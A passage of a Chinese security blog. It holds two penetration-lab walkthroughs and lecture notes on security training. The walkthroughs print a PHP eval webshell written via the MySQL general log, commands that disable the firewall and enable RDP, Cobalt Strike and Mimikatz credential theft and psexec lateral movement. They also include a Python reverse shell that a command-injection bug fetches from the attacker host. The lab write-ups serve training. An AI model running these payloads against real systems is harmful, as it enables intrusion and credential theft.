<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="漏洞一：信息泄露-弱口令"><a href="#漏洞一：信息泄露-弱口令" class="headerlink" title="漏洞一：信息泄露+弱口令"></a>漏洞一：信息泄露+弱口令</h3><p>网站<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms%E5%90%8E%E5%8F%B0%E6%B3%84%E9%9C%B2%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%9C%B0%E5%9D%80%E5%92%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E3%80%82">http://192.168.1.102/yxcms后台泄露后台登陆地址和用户密码。</a></p>
<p><img src="/2021/05/14/PenetrationRange/11.png"></p>
<p><img src="/2021/05/14/PenetrationRange/12.png"></p>
<p>成功登陆后台管理页面，可以添加、编辑、删除管理员，管理数据库及上传文件。</p>
<h3 id="漏洞二：PhpMyAdmin弱口令"><a href="#漏洞二：PhpMyAdmin弱口令" class="headerlink" title="漏洞二：PhpMyAdmin弱口令"></a>漏洞二：PhpMyAdmin弱口令</h3><p>使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面，可以看到数据库的所有内容</p>
<p><img src="/2021/05/14/PenetrationRange/13.jpg"></p>
<h3 id="漏洞三：yxcms留言本XSS存储型漏洞"><a href="#漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="漏洞三：yxcms留言本XSS存储型漏洞"></a>漏洞三：yxcms留言本XSS存储型漏洞</h3><p>前台提交带有XSS代码的留言，后台审核成功弹出XSS弹窗，审核通过之后，前台成功弹窗。通过该漏洞可以获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
<p><img src="/2021/05/14/PenetrationRange/14.jpg"></p>
<p><img src="/2021/05/14/PenetrationRange/13.png"></p>
<h3 id="漏洞四：yxcms后台任意文件读写漏洞"><a href="#漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="漏洞四：yxcms后台任意文件读写漏洞"></a>漏洞四：yxcms后台任意文件读写漏洞</h3><p>后台管理首页–&gt; 前台模板–&gt;管理模板文件 –&gt;新建hack.php文件</p>
<p><img src="/2021/05/14/PenetrationRange/14.png"></p>
<p>找备份文件即可看到文件的保存目录为：<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php">http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php</a></p>
<p><img src="/2021/05/14/PenetrationRange/15.jpg"></p>
<p>使用蚁剑成功连接：</p>
<p><img src="/2021/05/14/PenetrationRange/15.png"></p>
<h3 id="漏洞五：PhpMyAdmin开启全局日志getshell"><a href="#漏洞五：PhpMyAdmin开启全局日志getshell" class="headerlink" title="漏洞五：PhpMyAdmin开启全局日志getshell"></a>漏洞五：PhpMyAdmin开启全局日志getshell</h3><ol>
<li><p>测试是否可以使用into outfile写入文件到web目录：Select ‘<?php eval($_POST[hack]);?> ‘ into outfile ‘C:/phpStudy/WWW/hack.php’。发现写入失败。</p>
</li>
<li><p>再查看变量secure-file-priv 值： <code>show global variables like ‘%secure%’</code>发现为NULL，为只读无法修改。</p>
</li>
</ol>
<p><img src="/2021/05/14/PenetrationRange/16.png"></p>
<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
<ol start="3">
<li><p>尝试用全局日志写shell，查看全局变量general_log：<code>show global variables like ‘%general_%’</code>。于是开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/hack.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/2021/05/14/PenetrationRange/18.png"></p>
<p><img src="/2021/05/14/PenetrationRange/19.png"></p>
<p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
<p><img src="/2021/05/14/PenetrationRange/20.png"></p>
<p>使用蚁剑连接一句话木马<code>http://192.168.140.130/hack.php</code>。web目录直接IP加文件名就好。</p>
<h2 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h2><p>此时会用到Cobalt Strike, 以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
<p>我们用kali作为CS服务器，用蚁剑给win7上传java 11和CS。CS服务器和CS客户端分别如下：</p>
<p><img src="/2021/05/14/PenetrationRange/21.png"></p>
<p><img src="/2021/05/14/PenetrationRange/22.png"></p>
<p>选择监听器，为后头生成木马做铺垫</p>
<p>蚁剑关闭防火墙：终端执行：netsh advfirewall set allprofiles state off</p>
<p><img src="/2021/05/14/PenetrationRange/23.png"></p>
<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。发现是监听主机选错了，当然是要选择攻击方(服务器)。当然记得要选择为64位。</p>
<p>tips:</p>
<p>相同文件名的shell，蚁剑会上传失败。</p>
<p><img src="/2021/05/14/PenetrationRange/24.png"></p>
<p><img src="/2021/05/14/PenetrationRange/25.png"></p>
<p>终于提权成功了。</p>
<h2 id="0x04-后渗透之系统信息收集"><a href="#0x04-后渗透之系统信息收集" class="headerlink" title="0x04 后渗透之系统信息收集"></a>0x04 后渗透之系统信息收集</h2><h3 id="1-主机信息收集"><a href="#1-主机信息收集" class="headerlink" title="1.主机信息收集"></a>1.主机信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell ipconfig/all</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/PenetrationRange/26.png"></p>
<p>我们知道140是外网，还发现52网段。域是god.org，说明当前主机是在域内的，初步判断域名为god.org.</p>
<blockquote>
<p>内网信息收集：</p>
<p>查询主机名：whoami，hostname</p>
<p>查询系统体系架构：echo %PROCESSOR_ARCHITECTURE%</p>
<p>查看当前运行进程：wmic process list brief</p>
<p>域相关：</p>
<p>查询本地所有用户：net user</p>
<p>查看域内所有用户列表：net group /domain  </p>
<p>进入域：net group /domain:god</p>
<p>查看域成员计算机列表：net group “domain computers” /domain<br>查看域管理员用户，也就是域控：net group “domain admins” /domain </p>
<p>参考：<a target="_blank" rel="noopener" href="https://article.itxueyuan.com/56bEWk">https://article.itxueyuan.com/56bEWk</a></p>
</blockquote>
<p>查看本机名，hostname,架构，域信息等，CSshell执行命令实在是太慢了，后来发现是自己没改sleep时间，在Cobalt Strike中，默认心跳为60s，执行命令的响应很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显。主机扫描和端口扫描在beacon处，可直接用。</p>
<p>查看是否有常见的杀毒软件</p>
<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
<p><img src="/2021/05/14/PenetrationRange/27.png"></p>
<p><img src="/2021/05/14/PenetrationRange/28.png"></p>
<p><img src="/2021/05/14/PenetrationRange/29.png"></p>
<p><img src="/2021/05/14/PenetrationRange/30.png"></p>
<p><img src="/2021/05/14/PenetrationRange/31.png"></p>
<p><img src="/2021/05/14/PenetrationRange/32.png"></p>
<p><img src="/2021/05/14/PenetrationRange/33.png"></p>
<ul>
<li><p> 域控制用户：OWA</p>
</li>
<li><p>本机计算机：STU1，</p>
</li>
<li><p>域成员：ROOT-TVI862UBEH</p>
</li>
</ul>
<h3 id="2-主机密码收集"><a href="#2-主机密码收集" class="headerlink" title="2. 主机密码收集"></a>2. 主机密码收集</h3><p>拿到本机的Administrator权限，先提权，右键Access -&gt; Elevate，提权至System：</p>
<p><img src="/2021/05/14/PenetrationRange/45.png"></p>
<p>System权限-&gt;Access-&gt;Run Mimikaz，获取win7系统用户名和密码。这里要注意，如果域控登陆本机，可以直接拿到域控的账户和密码。</p>
<p>view -&gt; Credentials</p>
<p><img src="/2021/05/14/PenetrationRange/34.png"></p>
<h3 id="3-远程桌面登陆"><a href="#3-远程桌面登陆" class="headerlink" title="3.远程桌面登陆"></a>3.远程桌面登陆</h3><p>要使用远程桌面登陆的话，得远程开启对方的3389端口，不妨试试。当然得先关闭防火墙，之前上传shell的时候已经关闭了，所以此时不再需要。CS 右键Explore -&gt; Desktop(VNC)也可以直接远程桌面。</p>
<p><img src="/2021/05/14/PenetrationRange/35.png"></p>
<p>whoami的信息是god\administrator，密码是Security1</p>
<p>此时远程桌面登陆：</p>
<p><img src="/2021/05/14/PenetrationRange/36.png"></p>
<p><img src="/2021/05/14/PenetrationRange/37.png"></p>
<p>尝试多次一直登陆失败，是把用户名记成god，执行whoami看到是god\administrator。</p>
<blockquote>
<p>注：</p>
<p>注册表开启3389端口：<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t  REG_DWORD /d 00000000 /f</p>
</blockquote>
<h2 id="0x05-内网主机探测"><a href="#0x05-内网主机探测" class="headerlink" title="0x05 内网主机探测"></a>0x05 内网主机探测</h2><ul>
<li><p> 域控制用户：OWA</p>
</li>
<li><p>本机计算机：STU1，</p>
</li>
<li><p>域成员：ROOT-TVI862UBEH</p>
</li>
</ul>
<p>远程登陆之后发现win7已安装nmap，不妨利用起来，直接进行内网扫描。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p>k8的Ladon也可以直接进行内网扫描：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.52.0&#x2F;24 OnlinePC</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/PenetrationRange/38.png"></p>
<p>扫描端口：beacon上右键-&gt;Explore -&gt; PortScan</p>
<p><img src="/2021/05/14/PenetrationRange/39.png"></p>
<p>icmp扫描完之后，在view-&gt;target选项即可看到内网存活主机。</p>
<p><img src="/2021/05/14/PenetrationRange/40.png"></p>
<p>总结一下所开放端口，其实target处右键services可以直接看到每个主机所开放的端口。不过还是nmap的比较全.</p>
<p>138开放端口如下：</p>
<p><img src="/2021/05/14/PenetrationRange/41.png"></p>
<p>141开放端口如下：</p>
<p><img src="/2021/05/14/PenetrationRange/42.png"></p>
<p>143 <a target="_blank" rel="noopener" href="http://www.qiyuanxuetang.net/">www.qiyuanxuetang.net</a> 开放端口如下：</p>
<p><img src="/2021/05/14/PenetrationRange/43.png"></p>
<h2 id="0x06-横向移动拿权限"><a href="#0x06-横向移动拿权限" class="headerlink" title="0x06 横向移动拿权限"></a>0x06 横向移动拿权限</h2><p>目前我们只拿到本机的账户密码和System权限，我们需要去隐秘探测内网的其他主机。</p>
<p>第一种：Ladon发现</p>
<p>用Ladon扫描主机及漏洞，可以看到三者都存在MS17-010漏洞</p>
<p><img src="/2021/05/14/PenetrationRange/44.png"></p>
<p>第二种：使用SMB beacon</p>
<p>SMB beacon相对隐秘，对绕过防火墙有奇效。SMB beacon通过命名管道和父Beacon进行通讯。两个Beacons连接之后，父beacon发布任务并传送给子beacon，Beacon之间使用windows命名管道通信，此通信流量封装于SMB协议中。故而相对隐秘。</p>
<p>新建一个listener，payload设定为Beacon SMB</p>
<p><img src="/2021/05/14/PenetrationRange/46.png"></p>
<p>在已有的beacon上右键spawn生成会话，进行派生.选择建立的SMB beacon的listener。选择后会反弹一个子会话：</p>
<p><img src="/2021/05/14/PenetrationRange/47.png"></p>
<p>执行psexec有两种方法：</p>
<p>其一：选择用户登录</p>
<p>然后psexec使用凭证来登入其他主机。Beacon选择SMB，Listener选择本机128.</p>
<p>psexec会分别执行rev2self、make_token GOD.ORG\Administrator Security1、jump psexec OWA SMB</p>
<p><img src="/2021/05/14/PenetrationRange/48.png"></p>
<p>其二：token窃取</p>
<p><img src="/2021/05/14/PenetrationRange/50.png"></p>
<p><img src="/2021/05/14/PenetrationRange/51.png"></p>
<p>最终得到内网主机的System权限。</p>
<p><img src="/2021/05/14/PenetrationRange/49.png"></p>
<h2 id="0x07-CS-MSF联动使用MS17010扫描"><a href="#0x07-CS-MSF联动使用MS17010扫描" class="headerlink" title="0x07 CS-MSF联动使用MS17010扫描"></a>0x07 <strong>CS-MSF联动使用MS17010扫描</strong></h2><p>通过beacon内置的socks功能将本地Msf直接代入目标内网进行操作即可。socks 1080。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:127.0.0.1:1080</span><br><span class="line">setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/PenetrationRange/52.png"></p>
<p>同样拿到权限。</p>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>1，CS的Beacon后自带四个点，说明是通过代理服务器获得的控制权限。</p>
<h1 id="4-reference"><a href="#4-reference" class="headerlink" title="4.reference"></a>4.reference</h1><p>CS教程参考：<a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/204574">https://bbs.huaweicloud.com/blogs/204574</a></p>
<p><a target="_blank" rel="noopener" href="https://iter01.com/598439.html">https://iter01.com/598439.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html</a></p>
<p><a target="_blank" rel="noopener" href="https://chaceshadow.github.io/2020/09/28/ATC-CK-Vulnstack-1/#3-2-1-6-%E6%BC%8F%E6%B4%9E%E5%85%AD%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell">https://chaceshadow.github.io/2020/09/28/ATC-CK-Vulnstack-1/#3-2-1-6-%E6%BC%8F%E6%B4%9E%E5%85%AD%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/05/bulldog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/05/bulldog/" class="post-title-link" itemprop="url">渗透测试之bulldog</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-05 20:44:04" itemprop="dateCreated datePublished" datetime="2021-05-05T20:44:04+08:00">2021-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-06 17:07:00" itemprop="dateModified" datetime="2021-05-06T17:07:00+08:00">2021-05-06</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span></span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>NaN:aN</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日突然冒出渗透靶机的想法，突然一看，前人早已栽好了树。</p>
<p>每日分享：原来在孩提时期就已经看过余华的活着，只是当时读懂活着的人不是我。</p>
<p>小狗拼命的想叫醒他的同伴，可他还不知道同伴可能再也醒不过来了</p>
<p>每天都有人跟你一样在注视着生活中的点滴</p>
<p>最后献上红楼的一句箴言：假亦真时真亦假，无为有处有还无</p>
<p>不知道既喜欢红楼又喜欢昆曲，把后半辈子都献给教授外国人红楼梦的他，心境又是如何呢</p>
<p>人生本来就是尝试的过程，正确与否在你以为</p>
<p>也罢，继续写博客辽</p>
<h1 id="0x01-资产收集"><a href="#0x01-资产收集" class="headerlink" title="0x01 资产收集"></a>0x01 资产收集</h1><p>靶机：Ubuntu16.04：192.168.127.134</p>
<p>攻击机：kali 2021.1：192.168.127.133</p>
<p>愣是想不起来这个命令叫啥：lsb_release -a</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主机发现</span></span><br><span class="line"><span class="comment"># ping scan</span></span><br><span class="line">nmap -sn 192.168.127.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">masscan --rate=10000 --ports 0-65535 192.168.127.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 探究端口服务</span></span><br><span class="line">nmap -sV -T4 -O -p 23,80,8080 192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/1.png"></p>
<p>可以看到python版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描子域名</span></span><br><span class="line">dirb http://192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/2.png"></p>
<p>去康康admin和dev分别是什么服务。访问admin会看到无验证码的登陆界面，而dev必须登陆之后才可以看到。</p>
<p>dev页面有多个邮箱，去康康dev的源码，可能会md5加密的密码存储，一看还真有。解密之后尝试登陆admin页面，发现后两个账号可以登陆进去。不过账号是邮箱的前面，也就是姓名，登陆进去之后，发现dev界面的web shell也有了权限。其实这个界面类似于拿到一台被限制命令白名单的机子。尝试绕过吧。</p>
<p><img src="/2021/05/05/bulldog/4.png"></p>
<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p><strong>远程命令执行漏洞检测</strong>：</p>
<p>使用;同时执行多个命令，被过滤；</p>
<p>使用**&amp;,&amp;&amp;,|**同时执行多个命令,成功。</p>
<p>查看敏感目录，发现3个用户：<br><img src="/2021/05/05/bulldog/3.png"></p>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>试试反弹shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在kali的/var/html/www目录下，搭建web服务</span></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击机监听1234端口</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行wget命令尝试连接</span></span><br><span class="line">pwd &amp; wget http://192.168.127.133</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机下载shell文件</span></span><br><span class="line">ls &amp; wget http://192.168.56.133/shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行shell</span></span><br><span class="line">ls &amp; python shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机删除shell</span></span><br><span class="line">ls &amp; rm -rf shell.py</span><br></pre></td></tr></table></figure>

<p>其中反弹shell脚本shell.py内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># create an INET, STREAMing socket</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># now connect to the web server on port 1234</span></span><br><span class="line">s.connect((<span class="string">&quot;192.168.127.133&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">os.dup(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>



<p><img src="/2021/05/05/bulldog/5.png"></p>
<p>进入home，查看其他用户:bulldogadmin  django</p>
<p>进入bulldogadmin，查看所有文件，此时还是ls -la找到隐藏目录.hiddenadmindirectory。找到可执行文件customPermissionApp。<strong>strings</strong>查看其中字符</p>
<p><img src="/2021/05/05/bulldog/6.png"></p>
<p>猜测密码SUPERultimatePASSWORDyouCANTget。不过此处H到底代表什么暂时还不清楚。</p>
<h1 id="0x04-提权-后门维持"><a href="#0x04-提权-后门维持" class="headerlink" title="0x04  提权/后门维持"></a>0x04  提权/后门维持</h1><p>此时无法提权，需要打开新终端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开新终端</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><ol>
<li><p>习惯查看网页源码以及查看bash下所有文件<strong>ls -la</strong></p>
</li>
<li><p>&amp;&amp;   &amp;    |的妙用</p>
</li>
<li><p>当cat查看某些文件出现乱码时，可以考虑用strings</p>
</li>
<li><p>一般反弹的shell不如终端，一般拿到后都先用python弹一个终端出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&quot;</span>/bin/bash<span class="string">&quot;)&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li>
<li><p>反弹shell过程</p>
</li>
<li><p>知识点总结：</p>
<ul>
<li><p>Python -m ：mod,run library module  as  a   script</p>
</li>
<li><p>SimpleHTTPServe：use Python SimpleHTTPServer to turn any directory into a simple HTTP web server.</p>
</li>
<li><p>python http服务器运行在80端口</p>
</li>
<li><p>nmap -sn：ping scan</p>
</li>
<li><p>masscan –rate=10000 –ports 0-65535 192.168.127.134：</p>
<p>–rate=10000  意思是10kpps(packet per second)，每秒一万个数据包</p>
</li>
<li><p>wget：非交互式网络文件下载工具</p>
</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/" class="post-title-link" itemprop="url">方滨兴院士讲座有感</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-29 09:54:26" itemprop="dateCreated datePublished" datetime="2021-04-29T09:54:26+08:00">2021-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-03 21:38:39" itemprop="dateModified" datetime="2021-05-03T21:38:39+08:00">2021-05-03</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span></span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>NaN:aN</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="什么是六论视觉"><a href="#什么是六论视觉" class="headerlink" title="什么是六论视觉"></a>什么是六论视觉</h1><p>六论视觉：强弱是相对论,知识是认识论(敢闯无人区),失败是实践论,决策是矛盾论(多目标,化解矛盾才是最重要的),发展是进化论,管理是方法论(球不能停在自己脚下)</p>
<p>网络安全人才的培养的六论视觉：能力是相对论,安全是认识论,攻防是实践论,选择是矛盾论,水平是进化论,鉴别是进化论.</p>
<ol>
<li>安全是认识论：<br>超过5000就构成犯罪。所以会用到靶场(类比少林弟子)。</li>
</ol>
<h1 id="人才培养"><a href="#人才培养" class="headerlink" title="人才培养"></a>人才培养</h1><p><strong>技能：知识(西电)+方法(方班)</strong></p>
<ul>
<li><p>知识：事实 常识 规则</p>
</li>
<li><p>方法：思辨 质疑 创新</p>
<p>迅速适应企业的要求，迅速补上知识。自信的提升就是方法的提升。我觉得这么干是对的就是对的。美国一直行走在无人区。也要抬头看看是否真的无人，不怕走无人区，睁大眼睛可能有人做得比我好。</p>
<p>思辨：如小萁所言，把查到得信息变为知识为思辨的过程。需要训练。思辨才是看难文章的敲门砖。你最会什么?你最懂的知道什么？把一件事思辨的搞明白。会思辨之后，再看顶会(挑战难度)。听完之后，迅速提炼自己的问题。保证心里有预期答案。为什么没按。不应该有答案，也是提高。特别坚信他是错的。每次讲完做总结。</p>
</li>
</ul>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>靶场：vulhub  pikachu  raven  sqli-lab</p>
<p>内打内属于靶场(CTF)；内打外属于护网；外打外属于系统测试(方班演武堂)；外打内设备测试(大量人众测)。</p>
<p>军队搞CTF赛很奇葩，每年参加CTF没什么意义(相当于奥赛其实，对于初学者)，为了比赛而比赛不可取，应该参与真正的实战。</p>
<p>没有xss等。看的是逻辑漏洞，整个认证是在前端，认证应该在后端。改了应用程序，只看底层造成的。</p>
<p>不要培养专职的CTF选手。仅限在学校</p>
<h1 id="自我提高"><a href="#自我提高" class="headerlink" title="自我提高"></a>自我提高</h1><p><strong>最牛的要真的牛</strong></p>
<h2 id="状态："><a href="#状态：" class="headerlink" title="状态："></a>状态：</h2><p>有一个做的特别深,便会知道怎么做.</p>
<p>每天激情状态</p>
<p>需要空闲期去考虑自己下一步要做什么，单目标函数还是双目标函数。</p>
<p>喜欢理论支持博士，喜欢实践鼓励创业</p>
<p>先去公司就业，积累资源、人脉，然后去创业。</p>
<h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h2><p>靶场–&gt;对应的CTF赛题–&gt;实战、SRC。哪块弱补哪块。</p>
<h2 id="安排："><a href="#安排：" class="headerlink" title="安排："></a>安排：</h2><ol>
<li><strong>对于自己：各种靶场训练，然后实操。</strong></li>
